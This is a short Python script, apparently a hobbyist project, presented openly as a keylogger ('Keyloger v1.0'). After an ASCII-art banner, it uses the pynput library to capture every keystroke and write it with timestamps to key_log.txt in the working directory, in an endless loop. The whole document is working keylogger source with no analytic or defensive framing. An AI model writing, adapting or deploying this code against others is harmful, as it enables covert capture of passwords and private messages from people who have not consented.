
import logging
import os
from pynput.keyboard import Listener

def banner():
     print('___| Keyloger v1.0 |___')
     print('+[+[+[ Made in Hail ]+]+]+')
     print('''
     مرحبا
   __  __                          _
  |  \/  |                        | |
  | \  / | ___  ___  __ _  ___  __| |
  | |\/| |/ _ \/ __|/ _` |/ _ \/ _` |
  | |  | | (_) \__ \ (_| |  __/ (_| |
  |_|  |_|\___/|___/\__,_|\___|\__,_|
                                     \\
                                      \\
                                      Made at Alko5'
                           _
                          | |
         _         ____   | |                      ____
        | |      // ___|  | |     _   _   _       /    \\
    ____|_|_____|/_____   | |____| | | | | |_____(  ()  )
   |____|_|______\____\   |_|____|_|_|_|_|_|______\____/

   

     ''')


log_Directory = os.getcwd() + '/'  # where save file
print(os.getcwd()) # directory
# create file 
logging.basicConfig(filename=(log_Directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# function in logging
def on_press(key):
    logging.info(key)
    # when press key save the key in file

banner()

with Listener(on_press=on_press) as listener:
    listener.join()  # infinite cicle

